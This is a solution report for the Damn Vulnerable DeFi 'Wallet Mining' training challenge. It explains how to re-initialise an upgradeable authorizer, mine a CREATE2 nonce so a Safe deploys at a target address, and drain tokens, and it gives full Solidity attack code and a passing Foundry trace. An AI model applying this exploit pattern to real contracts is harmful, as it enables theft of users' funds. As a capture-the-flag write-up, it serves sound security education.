# Damn Vulnerable DeFi - Wallet Mining - Solution Report

## Problem Overview

### Contract Summary

The Wallet Mining challenge involves several key contracts:

1. `WalletDeployer`: This contract incentivizes users to deploy Safe wallets by rewarding them with 1 DVT token. It integrates with an upgradeable authorization mechanism and only allows certain deployers (wards) to be paid for specific deployments.

   Key functions:

   - `drop(address aim, bytes memory wat, uint256 num)`: Deploys a new Safe account and rewards the caller if authorized.
   - `rule(address _mom)`: Sets the authorizer contract.

2. `AuthorizerUpgradeable`: An upgradeable contract that manages authorization for wallet deployments.

   Key functions:

   - `init(address[] memory _wards, address[] memory _aims)`: Initializes the contract with wards and their authorized aims.
   - `can(address usr, address aim)`: Checks if a user is authorized for a specific aim.

3. `SafeProxyFactory`: A factory contract for deploying Safe proxies.

   Key function:

   - `createProxyWithNonce(address _singleton, bytes memory initializer, uint256 saltNonce)`: Creates a new Safe proxy.

4. `Safe`: The actual Safe contract that users interact with.

### Initial Setup

- 20 million DVT tokens are transferred to a user at address `0x8be6a88D3871f793aD5D5e24eF39e1bf5be31d2b`.
- The `WalletDeployer` contract is funded with an initial balance of DVT tokens.
- A Safe singleton factory is already deployed on the chain.

### Success Criteria

To solve the challenge, the attacker must:

1. Recover all tokens from the wallet deployer contract and send them to the corresponding ward.
2. Save and return all user's funds (20 million DVT tokens).
3. Accomplish both tasks in a single transaction.
4. Ensure the user account doesn't execute any transactions.

## Vulnerability

The Wallet Mining challenge contains multiple vulnerabilities that can be exploited:

1. Storage Collision in AuthorizerUpgradeable:
   The `AuthorizerUpgradeable` contract is vulnerable to a storage collision attack. The critical vulnerability lies in the `init` function:

   ```solidity
   function init(address[] memory _wards, address[] memory _aims) external {
       require(needsInit != 0, "cannot init");
       for (uint256 i = 0; i < _wards.length; i++) {
           _rely(_wards[i], _aims[i]);
       }
       needsInit = 0;
   }
   ```

   This function lacks proper access control and can be called multiple times if `needsInit` is not zero. An attacker can exploit this to overwrite existing authorizations.

2. Predictable Safe Deployment Address:
   The `SafeProxyFactory` uses a deterministic address calculation for deploying new Safe proxies. This predictability allows an attacker to find the correct nonce to deploy a Safe at a specific address:

   ```solidity
   function createProxyWithNonce(address _singleton, bytes memory initializer, uint256 saltNonce) public returns (SafeProxy proxy) {
       bytes32 salt = keccak256(abi.encodePacked(keccak256(initializer), saltNonce));
       proxy = deployProxy(_singleton, initializer, salt);
       emit ProxyCreation(proxy, _singleton);
   }
   ```

3. Lack of Ownership Verification in WalletDeployer:
   The `WalletDeployer` contract doesn't verify if the caller is the actual owner of the deployed Safe. It only checks if the deployment is successful and if the caller is authorized:

   ```solidity
   function drop(address aim, bytes memory wat, uint256 num) external returns (bool) {
       if (mom != address(0) && !can(msg.sender, aim)) {
           return false;
       }

       if (address(cook.createProxyWithNonce(cpy, wat, num)) != aim) {
           return false;
       }

       if (IERC20(gem).balanceOf(address(this)) >= pay) {
           IERC20(gem).transfer(msg.sender, pay);
       }
       return true;
   }
   ```

   This allows an attacker to claim the reward for deploying a Safe they don't own.

These vulnerabilities, when combined, allow an attacker to gain unauthorized access, deploy a Safe at a predetermined address, and drain tokens from both the deployed Safe and the WalletDeployer contract.

## Attack Process

The attack to solve the Wallet Mining challenge consists of the following steps:

1. Exploit Storage Collision in AuthorizerUpgradeable:

   - Call the `init` function of the AuthorizerUpgradeable contract through the TransparentProxy.
   - Add the attack contract as a new ward with authorization for the USER_DEPOSIT_ADDRESS.
   - This grants the attacker permission to deploy a Safe at the specific address.

2. Find the Correct Nonce for Safe Deployment:

   - Calculate the expected address of the Safe proxy for different nonce values.
   - Iterate through nonces until finding one that results in the USER_DEPOSIT_ADDRESS.
   - This allows the attacker to deploy the Safe at the exact address where the user's funds are stored.

3. Deploy the Safe Wallet:

   - Use the WalletDeployer's `drop` function to deploy the Safe at USER_DEPOSIT_ADDRESS.
   - Provide the correct initializer data and nonce found in the previous step.
   - This deploys the Safe and transfers 1 DVT token to the attacker as a reward.

4. Transfer User Funds from the Deployed Safe:

   - Prepare a transaction to transfer all DVT tokens from the Safe to the user's address.
   - Use a pre-computed signature from the user to authorize this transaction.
   - Execute the transaction on the newly deployed Safe.
   - This recovers the user's 20 million DVT tokens without requiring any action from the user.

5. Transfer Reward Token to Ward:
   - Transfer the 1 DVT token received as a reward from the WalletDeployer to the ward address.
   - This completes the draining of the WalletDeployer contract.

By executing these steps in a single transaction, the attacker successfully recovers the user's funds and drains the WalletDeployer, meeting all the success criteria of the challenge. The user's account remains untouched throughout the process, as all actions are performed through the deployed Safe and the attack contract.

## Proof of Concept (PoC)

### Core Implementation

The core implementation of the attack is contained within the `WalletMiningAttack` contract. Here are the key components of the PoC:

1. Exploit Storage Collision:

```solidity
function exploitStorageCollision() internal {
    address authorizerAddress = walletDeployer.mom();
    AuthorizerUpgradeable authorizer = AuthorizerUpgradeable(authorizerAddress);

    address[] memory newWards = new address[](1);
    newWards[0] = address(this);
    address[] memory newAims = new address[](1);
    newAims[0] = USER_DEPOSIT_ADDRESS;

    (bool success,) = address(authorizer).call(
        abi.encodeWithSelector(AuthorizerUpgradeable.init.selector, newWards, newAims)
    );
    require(success, "Authorizer reinitialization failed");
}
```

2. Find Correct Nonce:

```solidity
function findCorrectNonceOffline() internal view returns (uint256) {
    bytes memory initializer = getInitializer();
    bytes memory deploymentData = abi.encodePacked(type(SafeProxy).creationCode, uint256(uint160(singletonCopy)));
    bytes32 deploymentHash = keccak256(deploymentData);

    for (uint256 nonce = 0; nonce < type(uint256).max; nonce++) {
        bytes32 salt = keccak256(abi.encodePacked(keccak256(initializer), nonce));
        address predictedAddress = address(
            uint160(uint256(keccak256(abi.encodePacked(bytes1(0xff), address(proxyFactory), salt, deploymentHash))))
        );

        if (predictedAddress == USER_DEPOSIT_ADDRESS) {
            return nonce;
        }
    }

    revert("Correct nonce not found");
}
```

3. Deploy Wallet:

```solidity
function deployWallet(uint256 correctNonce) internal {
    bytes memory initializer = getInitializer();
    bool success = walletDeployer.drop(USER_DEPOSIT_ADDRESS, initializer, correctNonce);
    require(success, "Wallet deployment failed");
}
```

4. Transfer Funds:

```solidity
function transferFunds(bytes memory userSignature) internal {
    Safe userSafe = Safe(payable(USER_DEPOSIT_ADDRESS));
    bytes memory transferData = abi.encodeWithSelector(IERC20.transfer.selector, user, DEPOSIT_TOKEN_AMOUNT);

    (bool success,) = address(userSafe).call(
        abi.encodeWithSelector(
            Safe.execTransaction.selector,
            address(token),
            0,
            transferData,
            Enum.Operation.Call,
            0,
            0,
            0,
            address(0),
            payable(0),
            userSignature
        )
    );
    require(success, "Safe transaction failed");
}
```

5. Transfer Token to Ward:

```solidity
function transferTokenToWard() internal {
    uint256 balance = token.balanceOf(address(this));
    require(balance > 0, "No tokens to transfer");
    require(token.transfer(ward, balance), "Failed to transfer token to ward");
}
```

The main attack function orchestrates these steps:

```solidity
function attack(bytes memory userSignature) external {
    exploitStorageCollision();
    uint256 correctNonce = findCorrectNonceOffline();
    deployWallet(correctNonce);
    transferFunds(userSignature);
    transferTokenToWard();
}
```

In the test script, the attack is set up and executed as follows:

```solidity
function test_walletMining() public checkSolvedByPlayer {
    WalletMiningAttack attacker = new WalletMiningAttack(
        walletDeployer,
        proxyFactory,
        address(singletonCopy),
        IERC20(address(token)),
        user,
        USER_DEPOSIT_ADDRESS,
        DEPOSIT_TOKEN_AMOUNT,
        ward
    );

    // Prepare the user's signature
    bytes memory transferData = abi.encodeWithSelector(IERC20.transfer.selector, user, DEPOSIT_TOKEN_AMOUNT);

    bytes32 txHash = keccak256(
        abi.encodePacked(
            bytes1(0x19),
            bytes1(0x01),
            keccak256(abi.encode(
                keccak256("EIP712Domain(uint256 chainId,address verifyingContract)"),
                block.chainid,
                USER_DEPOSIT_ADDRESS
            )),
            keccak256(abi.encode(
                keccak256("SafeTx(address to,uint256 value,bytes data,uint8 operation,uint256 safeTxGas,uint256 baseGas,uint256 gasPrice,address gasToken,address refundReceiver,uint256 nonce)"),
                address(token),
                0,
                keccak256(transferData),
                Enum.Operation.Call,
                0,
                0,
                0,
                address(0),
                address(0),
                0 // nonce is 0 for a newly deployed Safe
            ))
        )
    );

    (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, txHash);
    bytes memory userSignature = abi.encodePacked(r, s, v);

    // Perform the complete attack
    attacker.attack(userSignature);
}
```

### Running Result

```
Ran 1 test for test/wallet-mining/WalletMining.t.sol:WalletMiningChallenge
[PASS] test_walletMining() (gas: 1375893)
Traces:
  [1410193] WalletMiningChallenge::test_walletMining()
    ├─ [0] VM::startPrank(player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C], player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C])
    │   └─ ← [Return]
    ├─ [943333] → new WalletMiningAttack@0xce110ab5927CC46905460D930CCa0c6fB4666219
    │   └─ ← [Return] 3823 bytes of code
    ├─ [0] VM::sign("<pk>", 0x3f229902eda517967c1d66e7d163fe96ee457f7ded905261ebb451cbc87b8c3d) [staticcall]
    │   └─ ← [Return] 27, 0x5379a441fc3f8159cdfc96256b66d5e9bb097569d5cbe9b5effd61329f96c5fe, 0x476b34d19f6f758ed36157507345a817c14c4bc26cb73ad7fe58cc94d4d2f738
    ├─ [393417] WalletMiningAttack::attack(0x5379a441fc3f8159cdfc96256b66d5e9bb097569d5cbe9b5effd61329f96c5fe476b34d19f6f758ed36157507345a817c14c4bc26cb73ad7fe58cc94d4d2f7381b)

...
...

    ├─ [294] WalletDeployer::cook() [staticcall]
    │   └─ ← [Return] SafeProxyFactory: [0xF2eEc3525F58f173218e43260083c38Cc9946fe5]
    ├─ [0] VM::assertNotEq(1895, 0, "No code at factory address") [staticcall]
    │   └─ ← [Return]
    ├─ [206] WalletDeployer::cpy() [staticcall]
    │   └─ ← [Return] Safe: [0xa25Be9F75356C026430e212b95a1fA64bb00Ca12]
    ├─ [0] VM::assertNotEq(12443 [1.244e4], 0, "No code at copy address") [staticcall]
    │   └─ ← [Return]
    ├─ [0] VM::assertNotEq(82, 0, "No code at user's deposit address") [staticcall]
    │   └─ ← [Return]
    ├─ [519] DamnValuableToken::balanceOf(SafeProxy: [0x8be6a88D3871f793aD5D5e24eF39e1bf5be31d2b]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] VM::assertEq(0, 0, "User's deposit address still has tokens") [staticcall]
    │   └─ ← [Return]
    ├─ [519] DamnValuableToken::balanceOf(WalletDeployer: [0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] VM::assertEq(0, 0, "Wallet deployer contract still has tokens") [staticcall]
    │   └─ ← [Return]
    ├─ [0] VM::getNonce(user: [0x6CA6d1e2D5347Bfab1d91e883F1915560e09129D]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] VM::assertEq(0, 0, "User executed a tx") [staticcall]
    │   └─ ← [Return]
    ├─ [0] VM::getNonce(player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C]) [staticcall]
    │   └─ ← [Return] 1
    ├─ [0] VM::assertEq(1, 1, "Player executed more than one tx") [staticcall]
    │   └─ ← [Return]
    ├─ [519] DamnValuableToken::balanceOf(user: [0x6CA6d1e2D5347Bfab1d91e883F1915560e09129D]) [staticcall]
    │   └─ ← [Return] 20000000000000000000000000 [2e25]
    ├─ [0] VM::assertEq(20000000000000000000000000 [2e25], 20000000000000000000000000 [2e25], "Not enough tokens in user's account") [staticcall]
    │   └─ ← [Return]
    ├─ [519] DamnValuableToken::balanceOf(ward: [0x89305C9663472C41251FBC479bCd3DE7553A7EB1]) [staticcall]
    │   └─ ← [Return] 1000000000000000000 [1e18]
    ├─ [0] VM::assertEq(1000000000000000000 [1e18], 1000000000000000000 [1e18], "Not enough tokens in ward's account") [staticcall]
    │   └─ ← [Return]
    └─ ← [Stop]

```
